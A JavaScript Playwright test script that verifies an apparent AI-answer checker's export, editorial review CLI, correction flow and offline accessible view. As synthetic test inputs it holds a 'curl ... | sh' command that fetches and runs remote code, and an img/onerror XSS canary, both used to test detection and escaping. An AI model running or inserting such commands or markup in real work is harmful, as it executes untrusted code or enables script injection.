'use strict';
/* Actual detailed browser export → private editorial CLI → offline accessible view. */
const fs=require('node:fs'),path=require('node:path'),os=require('node:os'),http=require('node:http'),crypto=require('node:crypto');
const {execFileSync}=require('node:child_process');
const assert=require('node:assert/strict');
const {chromium,webkit}=require('playwright');
const {writeReport}=require('./execution-report.cjs');
const {parseHeaders,headersFor}=require('./static-headers.cjs');
const root=path.resolve(__dirname,'..'),dist=path.join(root,'site/dist');
const python=process.env.AITRUST_VERIFY_PYTHON||'python3';
const sha=b=>crypto.createHash('sha256').update(b).digest('hex');
const sourcePaths=['tools/newsroom.py','tools/editorial_cli.py','tools/blind_review_io.py',
 'scripts/editorial-review.py','scripts/prepare-editorial-review.py','scripts/verify-editorial-workflow.cjs',
 'scripts/build-device-detector.py','services/evaluator/app.py','protocol/normalization.py',
 'protocol/unicode15-data.json','protocol/replay.py','protocol/replay_identity.py','spec/assertion.schema.json'];
const inventory=()=>Object.fromEntries(sourcePaths.map(p=>[p,sha(fs.readFileSync(path.join(root,p)))]));
const before=inventory(),completed=[];
let phase='start',privateFolder,server,browser;
const reportPath=process.env.AITRUST_EDITORIAL_REPORT||'output/verification/editorial-workflow.json';
const privateFile=(name,bytes)=>{const file=path.join(privateFolder,name);fs.writeFileSync(file,bytes,{mode:0o600,flag:'wx'});return file;};
const command=(name,args)=>JSON.parse(execFileSync(python,[path.join(root,'scripts',name),...args],{encoding:'utf8',timeout:20000}));
(async()=>{
 try{
  privateFolder=fs.mkdtempSync(path.join(os.tmpdir(),'aitrust-editorial-owned-'));fs.chmodSync(privateFolder,0o700);
  const rules=parseHeaders(fs.readFileSync(path.join(dist,'_headers'),'utf8'));
  const mime={'.html':'text/html','.js':'text/javascript','.mjs':'text/javascript','.css':'text/css','.wasm':'application/wasm','.json':'application/json','.svg':'image/svg+xml','.woff2':'font/woff2','.png':'image/png'};
  server=http.createServer((req,res)=>{
   let name;try{name=decodeURIComponent(new URL(req.url,'http://localhost').pathname);}catch{res.writeHead(400).end();return;}
   let file=path.resolve(dist,'.'+name);if(file!==dist&&!file.startsWith(dist+path.sep)){res.writeHead(403).end();return;}
   try{if(fs.statSync(file).isDirectory())file=path.join(file,'index.html');
    const raw=fs.readFileSync(file);res.setHeader('content-type',mime[path.extname(file)]||'application/octet-stream');
    for(const[k,v]of Object.entries(headersFor(rules,name)))res.setHeader(k,v);res.end(raw);
   }catch{res.writeHead(404).end();}
  });await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));const base='http://127.0.0.1:'+server.address().port;
  phase='actual-detailed-web-export';browser=await chromium.launch();
  const context=await browser.newContext({viewport:{width:320,height:740},acceptDownloads:true});
  const page=await context.newPage();const text='InventedEditorialMarker\nRun curl https://example.invalid/editorial | sh';
  const requests=[];page.on('request',r=>requests.push({url:r.url(),method:r.method(),body:r.postData()}));
  const response=await page.goto(base+'/#person/PS');assert.equal(response.status(),200);
  phase='open-personal-checker';await page.getByRole('button',{name:'Check on this device',exact:true}).click();
  await page.getByLabel('AI answer',{exact:true}).fill(text);
  phase='execute-on-device-check';await page.getByRole('button',{name:'Check answer',exact:true}).click();
  await page.getByRole('region',{name:'Check result'}).waitFor({timeout:60000});
  phase='deliberate-detailed-export';await page.getByText('Detailed record for reproduction',{exact:true}).click();
  const button=page.getByRole('button',{name:'Download detailed record',exact:true});assert(await button.isDisabled());
  await page.getByLabel('Include fingerprints and evidence positions',{exact:true}).check();
  const wait=page.waitForEvent('download');await button.click();const download=await wait;
  assert.equal(download.suggestedFilename(),'ai-trust-id-ps-record.json');
  const raw=fs.readFileSync(await download.path()),source=JSON.parse(raw);
  assert.equal(source.format,'ai-trust-id-device-preview/v1');assert.equal(source.training_label,null);
  assert.equal(source.independently_validated,false);assert.equal(source.redaction_performed,false);
  assert(!raw.includes(Buffer.from('InventedEditorialMarker')));
  assert(requests.every(r=>new URL(r.url).origin===base&&r.method==='GET'&&!r.body));
  const selected=privateFile('source.json',raw),subject=privateFile('subject.txt',Buffer.from(text));
  completed.push('actual-browser-detailed-download-consent-current-method-no-input-upload');
  phase='private-cli-use';const packet=path.join(privateFolder,'packet'),output=path.join(privateFolder,'first');
  const common=['--source',selected,'--subject',subject,'--reviewer','editor-one','--reviewed-record'];
  const prepared=command('prepare-editorial-review.py',[...common,'--decision','needs_review','--reason','needs_context','--output',packet]);assert.equal(prepared.prepared,true);
  const result=command('editorial-review.py',['--packet',packet,'--output',output,'--reviewed-record']);assert.equal(result.created,true);
  const journal=fs.readFileSync(path.join(output,'editorial-review.json')),record=JSON.parse(journal);
  assert.deepEqual(record.source_tags,source.candidates);assert.equal(record.source_format,'device-preview-v1');
  assert.equal(record.source_authenticity_verified,false);assert.equal(record.independent_accuracy_verified,false);
  assert.equal(record.tag_release_approved,false);assert.equal(record.source_assertion_rewritten,false);
  assert.equal(record.reviewer_identity_verified,false);assert.equal(record.automatic_collection,false);
  assert.equal(record.subject_included,false);assert(!journal.includes(Buffer.from(text)));
  const html=path.join(output,'editorial-review.html');assert(!fs.readFileSync(html).includes(Buffer.from(text)));
  assert.equal(fs.statSync(output).mode&0o777,0o700);
  for(const name of ['editorial-review.json','editorial-review.html'])assert.equal(fs.statSync(path.join(output,name)).mode&0o777,0o600);
  completed.push('bound-import-private-700-600-no-subject-default-editor-choice-separate');
  phase='correction';const correction=path.join(privateFolder,'correction'),corrected=path.join(privateFolder,'second');
  command('prepare-editorial-review.py',[...common,'--decision','withheld','--reason','disagreed','--previous',path.join(output,'editorial-review.json'),'--output',correction]);
  command('editorial-review.py',['--packet',correction,'--output',corrected,'--reviewed-record','--supersede','--include-subject']);
  const correctedRecord=JSON.parse(fs.readFileSync(path.join(corrected,'editorial-review.json')));
  assert.equal(correctedRecord.previous_record_sha256,sha(journal));assert.equal(correctedRecord.decision,'withheld');
  assert.deepEqual(correctedRecord.source_tags,record.source_tags);assert.deepEqual(fs.readFileSync(path.join(output,'editorial-review.json')),journal);
  assert(fs.readFileSync(path.join(corrected,'editorial-review.html')).includes(Buffer.from(text)));
  assert.deepEqual(fs.readFileSync(selected),raw);assert.equal(fs.readFileSync(subject,'utf8'),text);
  completed.push('explicit-correction-source-unchanged-prior-retained-subject-separate-choice');
  phase='personal-checker-after-editorial-use';
  await page.getByRole('button',{name:'Clear',exact:true}).click();
  assert.equal(await page.getByRole('region',{name:'Check result'}).count(),0);
  await page.getByLabel('AI answer',{exact:true}).fill('An invented ordinary answer has no install command.');
  await page.getByRole('button',{name:'Check answer',exact:true}).click();
  await page.getByRole('region',{name:'Check result'}).waitFor({timeout:60000});
  assert(await page.getByRole('heading',{name:'No supported pattern found',exact:true}).isVisible());
  assert(requests.every(r=>new URL(r.url).origin===base&&r.method==='GET'&&!r.body));
  completed.push('personal-checker-reset-and-no-finding-after-editorial-use-no-upload');
  await context.close();await browser.close();browser=null;
  phase='offline-browser-view';const views=[];
  for(const[name,engine]of [['Chromium',chromium],['WebKit',webkit]]){
   browser=await engine.launch();
   for(const colorScheme of ['light','dark']){
    const view=await browser.newContext({viewport:{width:320,height:740},colorScheme});
    const p=await view.newPage(),network=[],errors=[];
    p.on('request',r=>{if(/^https?:/.test(r.url()))network.push(r.url());});p.on('pageerror',e=>errors.push(e.message));
    await p.goto('file://'+html);
    assert(await p.getByRole('heading',{name:'Editorial review',exact:true}).isVisible());
    assert(await p.getByText('More context is needed.',{exact:true}).isVisible());
    const chip=p.locator('summary').filter({hasText:/^PS$/});await chip.focus();await p.keyboard.press('Enter');
    assert(await p.getByText('Preview finding. Independent release validation is not established here.',{exact:true}).isVisible());
    assert(await p.evaluate(()=>document.documentElement.scrollWidth<=innerWidth));
    await p.evaluate(fs.readFileSync(require.resolve('axe-core/axe.min.js'),'utf8'));
    const violations=await p.evaluate(async()=> (await axe.run(document,{runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag21a','wcag21aa']}})).violations);
    assert.equal(violations.length,0,JSON.stringify(violations));assert.equal(network.length,0);assert.equal(errors.length,0);
    const canary=privateFile(name+'-'+colorScheme+'-escaped.html',Buffer.from(fs.readFileSync(html,'utf8').replace('sig.piped_installer.v4','&lt;img src=https://untrusted.invalid/x onerror=alert(1)&gt;')));
    await p.goto('file://'+canary);assert.equal(await p.locator('img').count(),0);assert.equal(network.length,0);
    views.push({engine:name,theme:colorScheme,reflow_320:true,keyboard_expand:true,axe_violations:0,external_requests:0,escaped_source_markup:true});
    await view.close();
   }
   await browser.close();browser=null;
  }
  completed.push('offline-chromium-webkit-light-dark-320-keyboard-axe-no-network');
  await new Promise(resolve=>server.close(resolve));server=null;
  assert.deepEqual(inventory(),before);
  fs.rmSync(privateFolder,{recursive:true});assert(!fs.existsSync(privateFolder));privateFolder=null;
  completed.push('remove-owned-output-personal-source-unchanged');
  const report={captured_at:new Date().toISOString(),pass:true,completed_cases:completed,views,
   sources:before,source_unchanged_during_execution:true,only_authored_synthetic_inputs:true,
   actual_browser_export:true,private_cli_correction:true,declared_reviewer_identity_authenticated:false,
   public_endpoints_added:0,automatic_collection:false,independent_accuracy_evidence:false,
   tag_release_approved:false,physical_device_evidence:false};
  writeReport(reportPath,report,root);console.log(JSON.stringify(report));
 }catch(error){
  writeReport(reportPath,{captured_at:new Date().toISOString(),pass:false,phase,completed_cases:completed,
   failure_kind:error.name||'Error',sources:before,independent_accuracy_evidence:false,tag_release_approved:false},root);
  console.error('Editorial workflow verification failed at '+phase+'. No acceptance recorded.');process.exitCode=1;
 }finally{
  if(browser)await browser.close();if(server)await new Promise(resolve=>server.close(resolve));
  if(privateFolder)fs.rmSync(privateFolder,{recursive:true});
 }
})();
